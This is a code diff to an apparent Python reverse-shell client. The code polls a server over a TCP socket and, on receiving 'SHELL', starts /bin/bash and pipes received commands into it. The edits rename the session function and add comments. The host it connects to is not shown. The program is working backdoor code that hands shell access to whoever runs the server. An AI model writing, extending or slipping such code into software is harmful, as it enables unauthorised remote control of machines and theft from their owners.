@@ -49,6 +49,7 @@ def subp_run(command):
                           stdin=subprocess.PIPE,
                           timeout=None)
 
+
 def ping():
     with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
         try:
@@ -66,12 +67,16 @@ def ping():
             data = s.recv(1024)  # TODO timeout before back to pinging
             if data == b'SHELL':
                 print(data)
-                loop_shell(s)
+                session(s)  # Drop into a session
         else:
             time.sleep(5)
-            ping()
+            ping()  # Close this socket, reopen a new one, try again
 
-def loop_shell(s: socket):
+
+def session(s: socket):
+    """
+    :param s: A socket that received b'SHELL' (from server.py)
+    """
 
     proc = subprocess.Popen(['/bin/bash'],
                             shell=False,
@@ -83,7 +88,7 @@ def loop_shell(s: socket):
     while True:
         data = s.recv(1024)
         print(data)
-        assert data[-4:] == b' AYE'
+        assert data[-4:] == b' AYE'  # End of message
         proc.stdin.write(data[:-4]+b'\n')
         time.sleep(1)
         print(proc.stdout.readline())
